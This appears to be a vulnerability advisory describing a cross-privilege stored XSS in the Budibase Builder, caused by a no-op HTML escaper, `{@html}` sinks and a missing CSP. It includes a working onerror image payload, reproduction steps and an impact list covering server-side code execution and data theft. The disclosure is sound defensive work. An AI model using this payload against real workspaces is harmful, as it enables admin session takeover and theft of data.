The Builder SPA is served by nginx with **no Content-Security-Policy** (the CSP middleware only decorates the server-rendered *published-app* document, not `/builder/`). The injected script therefore runs unrestricted in the highest-trust surface of the product - the admin/builder session that can create datasources, run server-side JavaScript via automations, read and modify every table, and manage users. This is a **cross-privilege stored XSS** (app end-user → builder/admin), i.e. full workspace takeover, not self-XSS.

### Details

**Root cause 1 - the escaper is a no-op.**
`packages/frontend-core/src/utils/jsonFormatter.ts` (`format()`):

```js
jsonString = jsonString
  .replace(/&/g, "&")   // no-op: replaces "&" with "&"  (should be "&amp;")
  .replace(/</g, "<")   // no-op                          (should be "&lt;")
  .replace(/>/g, ">")   // no-op                          (should be "&gt;")

return jsonString.replace(
  /("(\\u[a-zA-Z0-9]{4}|\\[^u]|[^\\"])*"(\s*:)?|\b(true|false|null)\b|-?\d+...)/g,
  (match) => {
    if (/^"/.test(match)) {
      if (/:$/.test(match)) { color = colors.keyColor }                        // KEY: NOT escaped
      else { match = '"' + escapeHtml(match.substr(1, match.length - 2)) + '"' } // string VALUE: escaped
    }
    return `<span style="...">${match}</span>`
  })
```

Only quoted JSON *string values* are passed through `escapeHtml`. Everything else is emitted verbatim, because the leading `.replace(/&/g,"&")…` chain replaces each character with itself. Two consequences:

1. A **raw, non-JSON string** (the normal result of a Handlebars binding that resolves to a plain text field value) matches none of the regex tokens and is returned **completely un-escaped**.
2. **Object keys** are never escaped.

**Root cause 2 - the output is injected with `{@html}`.**
`packages/builder/src/components/common/bindings/EvaluationSidePanel.svelte`:

- line 116: `{@html logLine.log}`
- line 128: `{@html highlightedResult}`

`highlightedResult` is the output of `JsonFormatter.format()`, so the un-escaped attacker string is inserted into the DOM as live markup.

**Root cause 3 - binding output is not entity-escaped upstream.**
Every `{{ … }}` statement is wrapped by the `ALL` helper in `packages/string-templates/src/helpers/index.ts`, which returns a `Handlebars.SafeString`; Handlebars therefore performs no HTML escaping, and the raw field value reaches the formatter/`{@html}` sink.

**Root cause 4 - no CSP on the Builder.**
`GET /builder/*` is served as a static SPA by nginx with **no** `Content-Security-Policy` header (verified live below). The `contentSecurityPolicy` middleware (`packages/backend-core/src/middleware/contentSecurityPolicy.ts`) only sets a nonce-based CSP on the server-rendered *published-app* document (`serveApp`). So in the Builder origin there is no `script-src` restriction and inline event handlers run freely.

**Cross-privilege data channel.**
Internal-table dev/prod data live in separate databases, but **external datasources are queried live and shared** between the published app (where low-priv users write) and the Builder's dev preview (where the value is rendered). A `BASIC` app user writing to an external SQL table that a data-collection app exposes for writes therefore lands the payload directly in the Builder's evaluation context. `RowUtils.generateGoldenSample()` even *prefers the longest string per column*, guaranteeing a long payload is the sample the Preview evaluates.

**Payload shape note.** `jsonFormatter.format()` tokenises quoted strings, digits and `true/false/null` into `<span>`s, which would fragment a handler containing them. A payload free of double-quotes, digits and those literals - e.g. `<img src=x onerror=alert(window.xssproof=document.domain)>` - survives verbatim and executes.

#### Step 5 - VICTIM triggers execution (builder/admin, in the browser)

Logged into the Builder as `admin@budibase.local`, the victim opens the shared table and evaluates a binding over it - the ordinary workflow for building a Formula column:

1. Open the app → **Data tables** → datasource **LabPG** → table **`users_tbl`**.
2. Click the **+** to add a column, name it (e.g. `xsscol`), set **Type = Formula**.
3. Click the **lightning** (binding) icon on the *Formula* field → the binding drawer opens.
4. In the code editor type: `{{ name }}`
5. Click the **play** (▶ / evaluate) button.

The right-hand **Preview** panel renders the stored value through `JsonFormatter.format()` → `{@html}`. The injected `<img>` is inserted as a **live DOM element**; its `onerror` fires and the attacker's JavaScript runs in the Builder origin.

**Observed result (captured live in the reproduction):**

```
window.__xss_calls = ["localhost"]     // alert() was called with document.domain
window.xssproof    = "localhost"       // attacker JS mutated the Builder's window object
document.domain    = "localhost"       // execution context = the BUILDER origin
location.href      = http://localhost:3014/builder/workspace/app_dev_cc322a9cd27a492eb934f43b146c6e81/data/table/...
```

**Popup - `alert(document.domain)` firing in the Builder origin, with the injected `<img>` visible as a broken-image element in the Preview panel:**

![F4 stored XSS – alert popup in the Budibase Builder](./F4-xss-alert-popup.png)
<img width="1536" height="674" alt="F4-xss-alert-popup" src="https://github.com/user-attachments/assets/c9f7932b-0b1c-4165-863f-24e0bf8dceb7" />


> Screenshot note: the browser used for automated reproduction is headless, and native `alert()` dialogs are not captured by page-level screenshots. `window.alert` was therefore wrapped with a faithful, screenshot-capturable popup that displays exactly the argument the injected script passed to `alert()`. The execution itself is 100% genuine and unmodified - the payload's `onerror` handler ran, called `alert()`, and set `window.xssproof` on the real Builder `window` (see the observed values above). The broken-image glyph in the **Preview** pane is the attacker-controlled `<img src=x>` inserted by the `{@html}` sink.

### Impact

**Type:** Cross-privilege **Stored / persistent Cross-Site Scripting (XSS)** in the application builder.

**Who is impacted:** any self-hosted (or cloud) Budibase workspace that exposes an external-datasource table for writes to lower-privileged roles - the standard pattern for feedback forms, contact/lead capture, surveys, support tickets, registration, and any "data collection" app. On such apps the writer can be a `BASIC` app user or, when the write screen is public, an **unauthenticated** visitor.

**What the attacker gains:** the payload executes in the **Builder/admin session**, an origin with **no CSP**. From there the attacker's JavaScript can silently drive every authenticated Builder API in the victim's context, e.g.:

- create a REST/SQL **datasource** or an **automation** step that runs server-side JavaScript / Bash → **remote code execution** on the server;
- read or modify **every table** in the workspace (full data exfiltration / tampering);
- **escalate** the attacker's own account (or create a new one) to builder/admin;
- pivot to the underlying CouchDB/MinIO/Redis via server-side automation.
